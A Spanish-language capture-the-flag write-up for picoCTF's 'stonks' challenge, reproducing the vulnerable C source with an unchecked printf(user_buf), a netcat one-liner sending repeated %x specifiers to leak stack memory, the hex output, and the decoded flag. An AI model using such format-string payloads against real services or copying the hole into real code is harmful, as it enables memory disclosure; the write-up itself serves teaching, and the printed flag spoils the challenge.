## Objetivo
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/fdf270d959fa5231e180e2bd11421d0c/vuln.c) `nc mercury.picoctf.net 16439`
## Solución

```bash
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/stonks]
└─$ ls
vuln.c

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/stonks]
└─$ nano vuln.c 
```
- Revisamos el código.
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
        int shares;
        char symbol[MAX_SYM_LEN + 1];
        struct Stonks *next;
} Stonk;

typedef struct Portfolios {
        int money;
        Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
        if (!p) {
                return 1;
        }
        printf("\nPortfolio as of ");
        fflush(stdout);
        system("date"); // TODO: implement this in C
        fflush(stdout);

        printf("\n\n");
        Stonk *head = p->head;
        if (!head) {
                printf("You don't own any stonks!\n");
        }
        while (head) {
                printf("%d shares of %s\n", head->shares, head->symbol);
                head = head->next;
        }
        return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
        if (shares < 1) {
                return NULL;
        }
        Stonk *stonk = malloc(sizeof(Stonk));
        stonk->shares = shares;

        int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
        for (int i = 0; i <= MAX_SYM_LEN; i++) {
                if (i < AI_symbol_len) {
                        stonk->symbol[i] = 'A' + (rand() % 26);
                } else {
                        stonk->symbol[i] = '\0';
                }
        }

        stonk->next = NULL;

        return stonk;
}

int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);

        int money = p->money;
        int shares = 0;
        Stonk *temp = NULL;
        printf("Using patented AI algorithms to buy stonks\n");
        while (money > 0) {
                shares = (rand() % money) + 1;
                temp = pick_symbol_with_AI(shares);
                temp->next = p->head;
                p->head = temp;
                money -= shares;
        }
        printf("Stonks chosen\n");

        // TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);

        // TODO: Actually use key to interact with API

        view_portfolio(p);

        return 0;
}

Portfolio *initialize_portfolio() {
        Portfolio *p = malloc(sizeof(Portfolio));
        p->money = (rand() % 2018) + 1;
        p->head = NULL;
        return p;
}

void free_portfolio(Portfolio *p) {
        Stonk *current = p->head;
        Stonk *next = NULL;
        while (current) {
                next = current->next;
                free(current);
                current = next;
        }
        free(p);
}

int main(int argc, char *argv[])
{
        setbuf(stdout, NULL);
        srand(time(NULL));
        Portfolio *p = initialize_portfolio();
        if (!p) {
                printf("Memory failure\n");
                exit(1);
        }

        int resp = 0;

        printf("Welcome back to the trading app!\n\n");
        printf("What would you like to do?\n");
        printf("1) Buy some stonks!\n");
        printf("2) View my portfolio\n");
        scanf("%d", &resp);

        if (resp == 1) {
                buy_stonks(p);
        } else if (resp == 2) {
                view_portfolio(p);
        }

        free_portfolio(p);
        printf("Goodbye!\n");

        exit(0);
}
```
- Nos conectamos al puerto enviándole varios %x para que muestre la memoria en hexadecimal.
```bash
┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/stonks]
└─$ (echo "1";echo "%x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x%x%x%x%x%x%x%X%x%x%x%x") |nc mercury.picoctf.net 16439   
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
8364330804b00080489c3f7f46d80ffffffff18362160f7f54110f7f46dc708363180a836431083643306f6369707b465443306c5f49345F74356d5f6c6c306d5f795f79336e6263376365616336ffe3007df7f81af8f7f5444072159a0010f7de3ce9f7f550c0f7f465c0f7f46000ffe329d8f7dd468df7f465c08048ecaffe329e40F7F68F09804b000f7f46000f7f46e20ffe32a18
Portfolio as of Tue Nov 12 18:21:13 UTC 2024


10 shares of COL
37 shares of O
Goodbye!

┌──(armando㉿kali)-[~/picoCTF/binaryExplotation/stonks]
└─$ 
```
- El texto generado se lo enviamos a `CyberChef` y le aplicamos las etiquetas de `Swap endianness` y `From Hex`.
![[20241112122646.png]]

```bash
picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}
```


## Notas Adicionales
## Referencias
